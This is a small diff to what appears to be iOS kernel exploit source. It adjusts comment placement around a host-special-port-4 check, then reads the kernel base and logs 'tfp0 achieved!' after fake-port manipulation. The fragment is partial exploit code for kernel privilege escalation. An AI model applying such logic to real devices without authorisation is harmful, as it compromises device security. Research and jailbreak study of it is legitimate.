@@ -1425,6 +1425,7 @@ value = value | ((uint64_t)read64_tmp << 32);\
     LOG("ipc_space_kernel: 0x%llx", ipc_space_kernel);
     
     /* as soon as we modify our fakeport, we don't want to be using our old rw gadgets */
+    
 #undef rk64
 #undef rk32
     
@@ -1535,13 +1536,14 @@ value = value | ((uint64_t)read64_tmp << 32);\
         ret = KERN_FAILURE;
         goto out;
     }
+    */
     
     if (ret != KERN_SUCCESS ||
         !MACH_PORT_VALID(hsp4))
     {
         LOG("failed to set hsp4! error: %x %s, port: %x", ret, mach_error_string(ret), hsp4);
         goto out;
-    }*/
+    }
     
     /* test it */
     kbase_val = kread64(hsp4, kernel_base);
@@ -1552,6 +1554,7 @@ value = value | ((uint64_t)read64_tmp << 32);\
         goto out;
     }
     
+
     /* we're done! */
     LOG("tfp0 achieved!");
     LOG("base: 0x%llx", kbase_val);
